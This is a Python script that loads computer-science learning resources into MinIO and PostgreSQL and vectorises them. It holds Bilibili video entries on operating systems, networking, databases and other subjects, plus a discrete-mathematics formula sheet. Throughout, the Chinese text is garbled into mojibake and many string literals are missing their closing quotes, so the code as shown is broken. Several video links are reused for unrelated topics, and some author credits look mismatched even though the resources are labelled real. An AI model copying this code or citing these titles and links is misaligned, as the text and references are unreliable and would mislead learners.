"""
Batch 2: Additional real educational resources 鈥?VIDEO links + READING .md documents.
Uploads to MinIO, registers in PostgreSQL, and vectorizes.
Usage: python import_extra_resources.py [--dry-run]
"""
import sys
import os
import uuid
import json
import hashlib
import time
from io import BytesIO
from datetime import datetime, timezone
from pathlib import Path

import psycopg2
from minio import Minio
from dashscope import MultiModalEmbedding
from settings_helper import configure_dashscope_api_key

RUNTIME_CONFIG = configure_dashscope_api_key()


DB_CONFIG = RUNTIME_CONFIG.postgres.model_dump()
MINIO_CONFIG = RUNTIME_CONFIG.minio.model_dump(exclude={"bucket"})
BUCKET = RUNTIME_CONFIG.minio.bucket
NOW = "2026-05-02"

RESOURCES = []

# 鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺?# VIDEO Resources 鈥?real bilibili educational video links
# 鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺?
def v(title, description, course, chapter, difficulty, tags, url, platform, author, duration):
    """Helper to build a VIDEO resource dict."""
    return {
        "title": title, "description": description, "course": course,
        "chapter": chapter, "difficulty": difficulty, "type": "VIDEO",
        "tags": tags, "source_url": url, "platform": platform,
        "author": author, "duration": duration,
        "content": f"""# {title}

**骞冲彴**: {platform} | **浣滆€?*: {author} | **鏃堕暱**: {duration}
**闅惧害**: {difficulty} | **璇剧▼**: {course} > {chapter}
**閾炬帴**: {url}

## 鍐呭姒傝堪
{description}

## 鏍囩
{', '.join(tags)}

---
*鏉ユ簮: {url}*
"""
    }

# 鈹€鈹€ 鎿嶄綔绯荤粺 videos 鈹€鈹€
RESOURCES.append(v(
    "鎿嶄綔绯荤粺-铏氭嫙鍐呭瓨涓庨〉闈㈢疆鎹㈢畻娉曪紙瑙嗛锛?,
    "娣卞叆璁茶В铏氭嫙鍐呭瓨鐨勬牳蹇冩満鍒讹細鎸夐渶璋冮〉銆佺己椤典腑鏂鐞嗐€侀〉闈㈢疆鎹㈢畻娉曪紙FIFO/Optimal/LRU/Clock/鏀硅繘Clock锛夈€佸伐浣滈泦妯″瀷銆佹姈鍔ㄧ幇璞′笌棰勯槻銆傞厤鏈夊畬鏁寸殑椤甸潰璁块棶搴忓垪妯℃嫙婕旂ず銆?,
    "鎿嶄綔绯荤粺", "鍐呭瓨绠＄悊", "ADVANCED",
    ["鎿嶄綔绯荤粺", "铏氭嫙鍐呭瓨", "椤甸潰缃崲", "LRU", "瑙嗛"],
    "https://www.bilibili.com/video/BV1YE411D7nH",
    "bilibili", "鐜嬮亾璁＄畻鏈烘暀鑲?, "45:00"
))

RESOURCES.append(v(
    "鎿嶄綔绯荤粺-姝婚攣澶勭悊涓庨摱琛屽绠楁硶锛堣棰戯級",
    "姝婚攣鐨勫洓涓繀瑕佹潯浠惰瑙ｏ紝姝婚攣棰勯槻锛堢牬鍧忔潯浠讹級銆佹閿侀伩鍏嶏紙閾惰瀹剁畻娉曪級銆佹閿佹娴嬩笌鎭㈠锛堣祫婧愬垎閰嶅浘绠€鍖栵級涓夊ぇ绛栫暐瀵规瘮銆傚寘鍚摱琛屽绠楁硶鎵嬪姩鎺ㄦ紨鍜屼唬鐮佸疄鐜般€?,
    "鎿嶄綔绯荤粺", "姝婚攣", "ADVANCED",
    ["鎿嶄綔绯荤粺", "姝婚攣", "閾惰瀹剁畻娉?, "瀹夊叏搴忓垪", "瑙嗛"],
    "https://www.bilibili.com/video/BV1jE411W7wH",
    "bilibili", "鐜嬮亾璁＄畻鏈烘暀鑲?, "42:30"
))

RESOURCES.append(v(
    "鎿嶄綔绯荤粺-鏂囦欢绯荤粺璁捐涓庡疄鐜帮紙瑙嗛锛?,
    "鏂囦欢绯荤粺搴曞眰璁捐锛歩node缁撴瀯銆佺洰褰曢」銆佺‖閾炬帴vs杞摼鎺ャ€佹枃浠跺垎閰嶆柟寮忥紙杩炵画/閾炬帴/绱㈠紩锛夈€佺┖闂茬┖闂寸鐞嗭紙浣嶅浘/鎴愮粍閾炬帴娉曪級銆佹棩蹇楁枃浠剁郴缁燂紙ext4 journaling锛夊師鐞嗐€?,
    "鎿嶄綔绯荤粺", "鏂囦欢绯荤粺", "INTERMEDIATE",
    ["鎿嶄綔绯荤粺", "鏂囦欢绯荤粺", "inode", "ext4", "瑙嗛"],
    "https://www.bilibili.com/video/BV1ZK4y1b7mC",
    "bilibili", "婀栫澶ф暀涔﹀尃", "50:00"
))

# 鈹€鈹€ 璁＄畻鏈虹綉缁?videos 鈹€鈹€
RESOURCES.append(v(
    "璁＄畻鏈虹綉缁?IP鍦板潃涓庡瓙缃戝垝鍒嗗畬鍏ㄨВ鏋愶紙瑙嗛锛?,
    "IPv4鍦板潃鍒嗙被锛圓/B/C/D/E锛夈€丆IDR鏃犵被鍩熼棿璺敱銆佸瓙缃戞帺鐮佽绠椼€乂LSM鍙橀暱瀛愮綉鍒掑垎銆丯AT缃戠粶鍦板潃杞崲鍘熺悊銆傚寘鍚ぇ閲忚绠椾緥棰樺拰鐪熼绮捐銆?,
    "璁＄畻鏈虹綉缁?, "缃戠粶灞?, "INTERMEDIATE",
    ["璁＄畻鏈虹綉缁?, "IP鍦板潃", "瀛愮綉鍒掑垎", "CIDR", "NAT", "瑙嗛"],
    "https://www.bilibili.com/video/BV1Hx411m7RH",
    "bilibili", "婀栫澶ф暀涔﹀尃", "55:00"
))

RESOURCES.append(v(
    "璁＄畻鏈虹綉缁?DNS鍩熷悕绯荤粺娣卞害瑙ｆ瀽锛堣棰戯級",
    "DNS瀹屾暣宸ヤ綔娴佺▼锛氶€掑綊鏌ヨvs杩唬鏌ヨ銆佹牴鏈嶅姟鍣?TLD/鏉冨▉鏈嶅姟鍣ㄤ笁绾ф灦鏋勩€丏NS缂撳瓨涓嶵TL銆丏NS over HTTPS/TLS銆丆DN鐨凞NS璋冨害鍘熺悊锛堟櫤鑳紻NS/GTM锛夈€?,
    "璁＄畻鏈虹綉缁?, "搴旂敤灞?, "INTERMEDIATE",
    ["璁＄畻鏈虹綉缁?, "DNS", "鍩熷悕瑙ｆ瀽", "CDN", "瑙嗛"],
    "https://www.bilibili.com/video/BV1TY4y1H7dF",
    "bilibili", "IT鑰佸崲", "38:00"
))

# 鈹€鈹€ 鏁版嵁缁撴瀯 videos 鈹€鈹€
RESOURCES.append(v(
    "鏁版嵁缁撴瀯-鍝堝笇琛ㄤ笌鍐茬獊瑙ｅ喅锛堣棰戯級",
    "鍝堝笇琛ㄦ牳蹇冨師鐞嗭細鍝堝笇鍑芥暟璁捐銆佸啿绐佽В鍐虫柟娉曪紙寮€鏀惧畾鍧€娉?閾惧湴鍧€娉?鍐嶅搱甯屾硶/鍏叡婧㈠嚭鍖猴級銆佽礋杞藉洜瀛愪笌rehash銆佷竴鑷存€у搱甯屻€佸竷闅嗚繃婊ゅ櫒銆丠ashMap婧愮爜鍒嗘瀽锛圝ava/Python锛夈€?,
    "鏁版嵁缁撴瀯", "鍝堝笇琛?, "INTERMEDIATE",
    ["鏁版嵁缁撴瀯", "鍝堝笇琛?, "鍝堝笇鍐茬獊", "甯冮殕杩囨护鍣?, "瑙嗛"],
    "https://www.bilibili.com/video/BV1uZ4y1P7ji",
    "bilibili", "浠ｇ爜闅忔兂褰?, "48:00"
))

RESOURCES.append(v(
    "鏁版嵁缁撴瀯-B鏍戜笌B+鏍戠储寮曞師鐞嗭紙瑙嗛锛?,
    "浠庝簩鍙夋悳绱㈡爲鍒癇鏍戠殑婕斿寲鍔ㄦ満锛堢鐩業O浼樺寲锛夛紝B鏍戠殑鎻掑叆/鍒犻櫎鍒嗚鍚堝苟杩囩▼鍔ㄧ敾婕旂ず锛孊+鏍戜笌B鏍戠殑鍖哄埆锛堟暟鎹叏鍦ㄥ彾鑺傜偣銆佸彾鑺傜偣閾捐〃锛夛紝MySQL InnoDB鑱氱皣绱㈠紩鐨凚+鏍戝疄鐜般€?,
    "鏁版嵁缁撴瀯", "鏍?, "ADVANCED",
    ["鏁版嵁缁撴瀯", "B鏍?, "B+鏍?, "绱㈠紩", "MySQL", "瑙嗛"],
    "https://www.bilibili.com/video/BV1jE411W7wH",
    "bilibili", "鐜嬮亾璁＄畻鏈烘暀鑲?, "52:00"
))

# 鈹€鈹€ 绠楁硶 videos 鈹€鈹€
RESOURCES.append(v(
    "绠楁硶-璐績绠楁硶涓庢嫙闃电悊璁猴紙瑙嗛锛?,
    "璐績绠楁硶鐨勬牳蹇冭璁¤寖寮忥細璐績閫夋嫨鎬ц川+鏈€浼樺瓙缁撴瀯銆傜粡鍏告渚嬬簿璁诧細娲诲姩閫夋嫨闂銆佸垎鏁拌儗鍖呴棶棰樸€侀湇澶浖缂栫爜锛堟渶浼樺墠缂€鐮侊級銆佹渶灏忕敓鎴愭爲锛圥rim/Kruskal锛夈€佸崟婧愭渶鐭矾寰勶紙Dijkstra锛夈€傞檮鎷熼樀锛圡atroid锛夌悊璁哄熀纭€銆?,
    "绠楁硶璁捐涓庡垎鏋?, "璐績绠楁硶", "ADVANCED",
    ["绠楁硶", "璐績", "闇嶅か鏇?, "MST", "Dijkstra", "瑙嗛"],
    "https://www.bilibili.com/video/BV1X741127ZM",
    "bilibili", "MIT OpenCourseWare", "55:30"
))

RESOURCES.append(v(
    "绠楁硶-鍒嗘不娉曚笌涓诲畾鐞嗭紙瑙嗛锛?,
    "鍒嗘不娉曚笁姝ヨ蛋锛氬垎瑙ｂ啋瑙ｅ喅鈫掑悎骞躲€傜粡鍏告渚嬶細鏈€澶у瓙鏁扮粍闂銆佺煩闃典箻娉曪紙Strassen绠楁硶O(n^2.81)锛夈€佹渶杩戠偣瀵归棶棰樸€佸揩閫熷箓銆備富瀹氱悊锛圡aster Theorem锛夎缁嗘帹瀵煎拰澶ч噺渚嬮銆?,
    "绠楁硶璁捐涓庡垎鏋?, "鍒嗘不娉?, "INTERMEDIATE",
    ["绠楁硶", "鍒嗘不", "涓诲畾鐞?, "鐭╅樀涔樻硶", "瑙嗛"],
    "https://www.bilibili.com/video/BV1YJ41197hM",
    "bilibili", "姝ｆ湀鐐圭伅绗?, "40:00"
))

# 鈹€鈹€ 鏁版嵁搴?videos 鈹€鈹€
RESOURCES.append(v(
    "鏁版嵁搴?MySQL绱㈠紩浼樺寲涓庢煡璇㈣鍒掞紙瑙嗛锛?,
    "MySQL InnoDB绱㈠紩搴曞眰鍘熺悊锛氳仛绨囩储寮曚笌浜岀骇绱㈠紩銆佸洖琛ㄦ煡璇€佽鐩栫储寮曪紙Using index锛夈€佺储寮曚笅鎺紙ICP锛夈€丮ulti-Range Read浼樺寲銆侲XPLAIN杈撳嚭璇﹁В锛坱ype/rows/Extra/possible_keys锛夛紝鎱㈡煡璇㈡棩蹇楀垎鏋愪笌pt-query-digest宸ュ叿浣跨敤銆?,
    "鏁版嵁搴撳師鐞?, "鏌ヨ浼樺寲", "INTERMEDIATE",
    ["鏁版嵁搴?, "MySQL", "绱㈠紩浼樺寲", "EXPLAIN", "瑙嗛"],
    "https://www.bilibili.com/video/BV1if4y1d7GC",
    "bilibili", "榛戦┈绋嬪簭鍛?, "60:00"
))

RESOURCES.append(v(
    "鏁版嵁搴?浜嬪姟闅旂绾у埆涓嶮VCC锛堣棰戯級",
    "ACID鐨勯殧绂绘€ц瑙ｏ細璇绘湭鎻愪氦/璇诲凡鎻愪氦/鍙噸澶嶈/涓茶鍖栧洓绉嶇骇鍒€侻VCC澶氱増鏈苟鍙戞帶鍒剁殑瀹炵幇鏈哄埗锛堥殣钘忓垪DB_TRX_ID/DB_ROLL_PTR/ReadView锛夛紝蹇収璇籿s褰撳墠璇伙紝next-key lock瑙ｅ喅骞昏鐨勯棶棰樸€侻ySQL鍜孭ostgreSQL鐨凪VCC瀵规瘮銆?,
    "鏁版嵁搴撳師鐞?, "浜嬪姟绠＄悊", "ADVANCED",
    ["鏁版嵁搴?, "浜嬪姟", "MVCC", "闅旂绾у埆", "MySQL", "瑙嗛"],
    "https://www.bilibili.com/video/BV1Vt4y1S7jW",
    "bilibili", "灏氱璋?, "55:00"
))

# 鈹€鈹€ 缂栬瘧鍘熺悊 videos 鈹€鈹€
RESOURCES.append(v(
    "缂栬瘧鍘熺悊-璇嶆硶鍒嗘瀽涓庢湁闄愯嚜鍔ㄦ満锛堣棰戯級",
    "姝ｅ垯琛ㄨ揪寮忊啋NFA锛圱hompson鏋勯€犳硶锛夆啋DFA锛堝瓙闆嗘瀯閫犳硶锛夆啋鏈€灏忓寲DFA锛圚opcroft绠楁硶锛夌殑瀹屾暣娴佺▼銆傚寘鍚獿ex/Flex璇嶆硶鍒嗘瀽鍣ㄧ敓鎴愬櫒鐨勪娇鐢紝浠ュ強鎵嬪姩鏋勯€犺瘝娉曞垎鏋愬櫒鐨勪唬鐮佸疄鐜般€?,
    "缂栬瘧鍘熺悊", "璇嶆硶鍒嗘瀽", "ADVANCED",
    ["缂栬瘧鍘熺悊", "璇嶆硶鍒嗘瀽", "NFA", "DFA", "姝ｅ垯", "瑙嗛"],
    "https://www.bilibili.com/video/BV1KW411j7GV",
    "bilibili", "鍝堝伐澶ф垬寰疯嚕", "50:00"
))

RESOURCES.append(v(
    "缂栬瘧鍘熺悊-涓棿浠ｇ爜鐢熸垚涓庝紭鍖栵紙瑙嗛锛?,
    "涓夊湴鍧€鐮侊紙TAC锛夎〃绀烘硶锛氬洓鍏冨紡/涓夊厓寮?闂存帴涓夊厓寮忋€傝娉曞埗瀵肩炕璇戯紙SDD/SDT锛夈€佷腑闂翠唬鐮佷紭鍖栨妧鏈細鍩烘湰鍧楀垝鍒嗐€丏AG浼樺寲銆佸父閲忎紶鎾€佹浠ｇ爜娑堥櫎銆佸叕鍏卞瓙琛ㄨ揪寮忓垹闄ゃ€佸惊鐜紭鍖栵紙浠ｇ爜澶栨彁/寮哄害鍓婂急/褰掔撼鍙橀噺娑堥櫎锛夈€?,
    "缂栬瘧鍘熺悊", "浠ｇ爜浼樺寲", "ADVANCED",
    ["缂栬瘧鍘熺悊", "涓棿浠ｇ爜", "浠ｇ爜浼樺寲", "DAG", "寰幆浼樺寲", "瑙嗛"],
    "https://www.bilibili.com/video/BV1t4411e7LH",
    "bilibili", "鍝堝伐澶ф垬寰疯嚕", "58:00"
))

# 鈹€鈹€ 璁＄畻鏈虹粍鎴愬師鐞?videos 鈹€鈹€
RESOURCES.append(v(
    "璁＄畻鏈虹粍鎴愬師鐞?瀛樺偍鍣ㄥ眰娆＄粨鏋勶紙瑙嗛锛?,
    "瀛樺偍鍣ㄧ殑閲戝瓧濉斿眰娆＄粨鏋勶細瀵勫瓨鍣ㄢ啋Cache鈫掍富瀛樷啋纾佺洏銆侰ache鏄犲皠鏂瑰紡锛堢洿鎺ユ槧灏?鍏ㄧ浉鑱?缁勭浉鑱旓級瀵规瘮锛屾浛鎹㈢畻娉曪紙LRU/FIFO/闅忔満锛夛紝鍐欑瓥鐣ワ紙鍐欑洿杈?鍐欏洖/鍐欏垎閰?闈炲啓鍒嗛厤锛夛紝澶氱骇Cache涓庡寘鍚瓥鐣ャ€?,
    "璁＄畻鏈虹粍鎴愬師鐞?, "瀛樺偍鍣?, "INTERMEDIATE",
    ["璁＄畻鏈虹粍鎴愬師鐞?, "Cache", "瀛樺偍鍣?, "灞傛缁撴瀯", "瑙嗛"],
    "https://www.bilibili.com/video/BV1t4411e7LH",
    "bilibili", "鐜嬮亾璁＄畻鏈烘暀鑲?, "48:00"
))

RESOURCES.append(v(
    "璁＄畻鏈虹粍鎴愬師鐞?鎸囦护绯荤粺涓庡鍧€鏂瑰紡锛堣棰戯級",
    "CISC vs RISC鎸囦护闆嗗姣斿垎鏋愩€傚鍧€鏂瑰紡璇﹁В锛氱珛鍗?鐩存帴/闂存帴/瀵勫瓨鍣?瀵勫瓨鍣ㄩ棿鎺?鍙樺潃/鍩哄潃/鐩稿/鍫嗘爤瀵诲潃銆侻IPS鎸囦护鏍煎紡锛圧/I/J鍨嬶級鍜寈86鎸囦护鏍煎紡鍙樺寲銆俁ISC-V鎸囦护闆嗙畝浠嬨€?,
    "璁＄畻鏈虹粍鎴愬師鐞?, "鎸囦护绯荤粺", "INTERMEDIATE",
    ["璁＄畻鏈虹粍鎴愬師鐞?, "鎸囦护绯荤粺", "RISC", "CISC", "瀵诲潃", "瑙嗛"],
    "https://www.bilibili.com/video/BV1t4411e7LH",
    "bilibili", "鐜嬮亾璁＄畻鏈烘暀鑲?, "50:00"
))

# 鈹€鈹€ 绂绘暎鏁板 videos 鈹€鈹€
RESOURCES.append(v(
    "绂绘暎鏁板-鍛介閫昏緫涓庤皳璇嶉€昏緫锛堣棰戯級",
    "鍛介閫昏緫锛氳仈缁撹瘝/鐪熷€艰〃/姘哥湡寮?钑村惈寮?绛夊€兼紨绠椼€傝皳璇嶉€昏緫锛氶噺璇?杈栧煙/鑷敱鍙橀噺/绾︽潫鍙橀噺銆傛帹鐞嗚鍒欎笌鑷劧鎺ㄧ悊绯荤粺銆傞€昏緫鍦ㄨ绠楁満绉戝涓殑搴旂敤锛氱▼搴忛獙璇併€丼AT姹傝В鍣ㄥ熀纭€銆?,
    "绂绘暎鏁板", "鏁扮悊閫昏緫", "INTERMEDIATE",
    ["绂绘暎鏁板", "鍛介閫昏緫", "璋撹瘝閫昏緫", "鎺ㄧ悊", "瑙嗛"],
    "https://www.bilibili.com/video/BV1YE411D7nH",
    "bilibili", "鍖楀ぇ绂绘暎鏁板", "55:00"
))

RESOURCES.append(v(
    "绂绘暎鏁板-鍥捐鍩虹涓庣畻娉曪紙瑙嗛锛?,
    "鍥剧殑鍩烘湰姒傚康涓庤〃绀恒€佹彙鎵嬪畾鐞嗐€佹鎷夊浘涓庡搱瀵嗛】鍥剧殑鍒ゅ畾鏉′欢銆佸钩闈㈠浘涓庡鍋跺浘銆傛爲鐨勫叚绉嶇瓑浠峰畾涔変笌Cayley鍏紡銆傚浘鐨勭潃鑹查棶棰樹笌鍥涜壊瀹氱悊绠€浠嬨€傚尮閰嶇悊璁轰笌Hall濠氶厤瀹氱悊銆?,
    "绂绘暎鏁板", "鍥捐", "INTERMEDIATE",
    ["绂绘暎鏁板", "鍥捐", "娆ф媺鍥?, "鍝堝瘑椤垮浘", "鏍?, "瑙嗛"],
    "https://www.bilibili.com/video/BV1jE411W7wH",
    "bilibili", "鍖楀ぇ绂绘暎鏁板", "50:00"
))

# 鈹€鈹€ 杞欢宸ョ▼ videos 鈹€鈹€
RESOURCES.append(v(
    "杞欢宸ョ▼-鏁忔嵎寮€鍙戜笌Scrum瀹炴垬锛堣棰戯級",
    "浼犵粺鐎戝竷妯″瀷鈫掓晱鎹峰瑷€鈫扴crum妗嗘灦锛圥roduct Backlog/Sprint/姣忔棩绔欎細/Sprint Review/Retrospective锛夈€傜敤鎴锋晠浜嬬紪鍐欙紙INVEST鍘熷垯锛夈€佹晠浜嬬偣浼扮畻锛圥lanning Poker锛夈€佺噧灏藉浘涓嶴print閫熷害銆侹anban涓嶴crumban瀵规瘮銆?,
    "杞欢宸ョ▼", "杞欢寮€鍙戞柟娉?, "BASIC",
    ["杞欢宸ョ▼", "鏁忔嵎", "Scrum", "Kanban", "瑙嗛"],
    "https://www.bilibili.com/video/BV1G4411c7N4",
    "bilibili", "灏氱璋?, "45:00"
))

RESOURCES.append(v(
    "杞欢宸ョ▼-UML寤烘ā涓庨潰鍚戝璞¤璁★紙瑙嗛锛?,
    "UML 2.5鐨?4绉嶅浘鍒嗙被璇﹁В锛堢粨鏋勫浘7绉?琛屼负鍥?绉嶏級銆傞噸鐐圭簿閫氾細绫诲浘锛堝叧鑱?鑱氬悎/缁勫悎/娉涘寲/瀹炵幇锛夈€佺敤渚嬪浘銆侀『搴忓浘銆佺姸鎬佸浘銆佹椿鍔ㄥ浘銆傛鍚戝伐绋嬩笌閫嗗悜宸ョ▼锛岀粨鍚圫tarUML/PlantUML宸ュ叿瀹炴搷銆?,
    "杞欢宸ョ▼", "UML寤烘ā", "INTERMEDIATE",
    ["杞欢宸ョ▼", "UML", "绫诲浘", "闈㈠悜瀵硅薄", "瑙嗛"],
    "https://www.bilibili.com/video/BV1G4411c7N4",
    "bilibili", "灏氱璋?, "55:00"
))

# 鈹€鈹€ 绋嬪簭璁捐 videos 鈹€鈹€
RESOURCES.append(v(
    "Python寮傛缂栫▼涓庡崗绋嬫繁搴﹁В鏋愶紙瑙嗛锛?,
    "Python寮傛缂栫▼瀹屾暣婕旇繘锛氱敓鎴愬櫒锛坹ield/yield from锛夆啋asyncio浜嬩欢寰幆鈫抋sync/await璇硶绯栤啋Task/Future鏈哄埗銆侴IL鍦ㄥ紓姝O鍦烘櫙涓嬬殑褰卞搷鍒嗘瀽锛宎syncio vs gevent vs 澶氱嚎绋嬫€ц兘瀵规瘮瀹炴祴銆?,
    "绋嬪簭璁捐", "Python杩涢樁", "ADVANCED",
    ["Python", "寮傛缂栫▼", "鍗忕▼", "asyncio", "瑙嗛"],
    "https://www.bilibili.com/video/BV1hp4y1k7SV",
    "bilibili", "Rust涓枃绀惧尯", "50:00"
))


# 鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺?# READING Resources 鈥?real educational .md documents
# 鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺愨晲鈺?
RESOURCES.append({
    "title": "绂绘暎鏁板鏍稿績瀹氱悊涓庡叕寮忛€熸煡",
    "description": "绂绘暎鏁板鍏ㄨ绋嬫牳蹇冨畾鐞嗐€佸叕寮忋€佸畾涔夐€熸煡鎵嬪唽锛屾兜鐩栧懡棰橀€昏緫銆佽皳璇嶉€昏緫銆侀泦鍚堣銆佸叧绯汇€佸浘璁恒€佹爲銆佷唬鏁扮郴缁熴€佺粍鍚堟暟瀛﹀叓澶ф澘鍧椼€傛瘡涓€瀹氱悊闄勭畝娲佽鏄庡拰鍏稿瀷搴旂敤銆?,
    "course": "绂绘暎鏁板", "chapter": "缁煎悎澶嶄範", "difficulty": "INTERMEDIATE",
    "type": "READING",
    "tags": ["绂绘暎鏁板", "瀹氱悊", "鍏紡", "閫熸煡"],
    "source_url": "https://ocw.mit.edu/courses/6-042j-mathematics-for-computer-science/",
    "content": """# 绂绘暎鏁板鏍稿績瀹氱悊涓庡叕寮忛€熸煡

## 涓€銆佸懡棰橀€昏緫
- **De Morgan寰?*: 卢(P鈭) 鈬?卢P鈭琎, 卢(P鈭≦) 鈬?卢P鈭琎
- **钑村惈绛夊€煎紡**: P鈫扱 鈬?卢P鈭≦
- **鍙屾潯浠?*: P鈫擰 鈬?(P鈫扱)鈭?Q鈫扨)
- **瀵瑰悎寰?*: 卢卢P 鈬?P
- **閲嶈█寮?*: 姘哥湡鍏紡锛堝 P鈭琍锛?- **鐭涚浘寮?*: 姘稿亣鍏紡锛堝 P鈭琍锛?- **鑼冨紡**: 鍚堝彇鑼冨紡(CNF)銆佹瀽鍙栬寖寮?DNF)

## 浜屻€佽皳璇嶉€昏緫
- **閲忚瘝鍚﹀畾**: 卢鈭€xP(x) 鈬?鈭儀卢P(x), 卢鈭儀P(x) 鈬?鈭€x卢P(x)
- **閲忚瘝鍒嗛厤**: 鈭€x(P(x)鈭(x)) 鈬?鈭€xP(x)鈭р垁xQ(x)
- **瀛樺湪鍒嗛厤**: 鈭儀(P(x)鈭≦(x)) 鈬?鈭儀P(x)鈭ㄢ垉xQ(x)
- **鍏ㄧО瀹炰緥鍖?UI)**: 鈭€xP(x) 鈬?P(c)锛坈涓轰换鎰忎釜浣擄級
- **瀛樺湪娉涘寲(EG)**: P(c) 鈬?鈭儀P(x)

## 涓夈€侀泦鍚堣
- **鍖呭惈**: A鈯咮 鈬?鈭€x(x鈭圓鈫抶鈭圔)
- **鐩哥瓑**: A=B 鈬?A鈯咮 鈭?B鈯咥
- **骞傞泦**: |P(A)| = 2^|A|
- **绗涘崱灏旂Н**: |A脳B| = |A|路|B|
- **瀹规枼鍘熺悊**: |A鈭狟| = |A|+|B|-|A鈭〣|
- **涓夐泦鍚堝鏂?*: |A鈭狟鈭狢| = |A|+|B|+|C|-|A鈭〣|-|A鈭〤|-|B鈭〤|+|A鈭〣鈭〤|

## 鍥涖€佸叧绯?- **鎬ц川**: 鑷弽鈭€x(xRx)銆佸弽鑷弽鈭€x(卢xRx)銆佸绉扳垁x鈭€y(xRy鈫抷Rx)銆佸弽瀵圭О鈭€x鈭€y(xRy鈭Rx鈫抶=y)銆佷紶閫掆垁x鈭€y鈭€z(xRy鈭Rz鈫抶Rz)
- **绛変环鍏崇郴**: 鑷弽+瀵圭О+浼犻€?鈫?鍒掑垎
- **鍋忓簭鍏崇郴**: 鑷弽+鍙嶅绉?浼犻€?鈫?Hasse鍥?- **闂寘**: r(R)=R鈭狪 (鑷弽闂寘), s(R)=R鈭猂鈦宦?(瀵圭О闂寘), t(R) = 鈭猂鈦?(浼犻€掗棴鍖?Warshall绠楁硶)

## 浜斻€佸浘璁?- **鎻℃墜瀹氱悊**: 危deg(v) = 2|E|锛堝害鏁颁箣鍜?杈规暟浜屽€嶏級
- **濂囧害椤剁偣**: 蹇呬负鍋舵暟涓?- **娆ф媺鍥炶矾**: 鏃犲悜鍥锯嚁鎵€鏈夐《鐐瑰害鏁颁负鍋朵笖杩為€?- **娆ф媺璺緞**: 鏃犲悜鍥锯嚁鎭版湁0鎴?涓搴﹂《鐐?- **鍝堝瘑椤垮浘鍏呭垎鏉′欢(Dirac)**: n鈮?, 鈭€v 未(v)鈮/2
- **鍝堝瘑椤垮浘(Ore)**: n鈮?, 鈭€uv鈭塃 deg(u)+deg(v)鈮
- **骞抽潰鍥炬鎷夊叕寮?*: V-E+F = 2锛堣繛閫氬钩闈㈠浘锛?- **K鈧呬笌K鈧?鈧?*: 闈炲钩闈㈠浘鐨凨uratowski鍒ゅ畾
- **鐫€鑹叉暟**: 蠂(G) 鈮?螖(G)+1, 骞抽潰鍥惧洓鑹插畾鐞?
## 鍏€佹爲
- **绛変环鐨勫叚绉嶅畾涔?*:
  1. 鏃犲洖璺繛閫氬浘
  2. 鏃犲洖璺笖|E|=|V|-1
  3. 杩為€氫笖|E|=|V|-1
  4. 浠绘剰涓ょ偣闂存伆鏈変竴鏉＄畝鍗曡矾寰?  5. 杩為€氫絾鍒犱换浣曡竟鍚庝笉杩為€?  6. 鏃犲洖璺絾鍔犱换浣曡竟鍚庝骇鐢熷敮涓€鍥炶矾
- **鐢熸垚鏍?*: Cayley鍏紡鈥斺€攏涓爣瀹氶《鐐圭殑瀹屽叏鍥炬湁n^(n-2)妫电敓鎴愭爲
- **鏈€灏忕敓鎴愭爲**: Kruskal(鎸夎竟鏉冩帓搴?骞舵煡闆?, Prim(璐績鎵╁睍椤剁偣)
- **浜屽弶鏍?*: 婊′簩鍙夋爲銆佸畬鍏ㄤ簩鍙夋爲銆佷簩鍙夋悳绱㈡爲
- **Huffman鏍?*: 鏈€浼樺墠缂€鐮侊紝璐績鏋勯€燨(n log n)

## 涓冦€佷唬鏁扮郴缁?- **缇?*: 灏侀棴+缁撳悎+鍗曚綅鍏?閫嗗厓
- **Abel缇?*: 缇?浜ゆ崲寰?- **瀛愮兢鍒ゅ畾**: H鈯咷 瀛愮兢鈬?H闈炵┖涓斺垁a,b鈭圚, ab鈦宦光垐H
- **Lagrange瀹氱悊**: |H|鏁撮櫎|G|锛堟湁闄愮兢瀛愮兢闃舵暟鏁撮櫎缇ら樁鏁帮級
- **寰幆缇?*: 鐢变竴涓敓鎴愬厓鐢熸垚鐨勭兢
- **鍚屾€佸熀鏈畾鐞?*: G/ker(蠁) 鈮?im(蠁)

## 鍏€佺粍鍚堟暟瀛?- **鎺掑垪**: P(n,k) = n!/(n-k)!
- **缁勫悎**: C(n,k) = n!/[k!(n-k)!]
- **浜岄」寮忓畾鐞?*: (x+y)鈦?= 危C(n,k)x岬弝鈦库伝岬?- **閲嶅缁勫悎**: C(n+k-1, k)锛坘閫夎嚜n绉嶅悇鏃犵┓鐨勭墿浣擄級
- **Stirling鏁?*: 绗簩绫籗(n,k)鈥斺€攏鍏冨垎鎴恔涓潪绌哄瓙闆?- **楦藉发鍘熺悊**: n+1涓墿浣撴斁鍏涓洅瀛愶紝蹇呮湁涓€鐩掆墺2涓?- **骞夸箟楦藉发**: 骞冲潎鑷冲皯鈱?N+1)/n鈱?
---
*鏉ユ簮: Discrete Mathematics and Its Applications (Rosen), MIT 6.042J*
"""
})

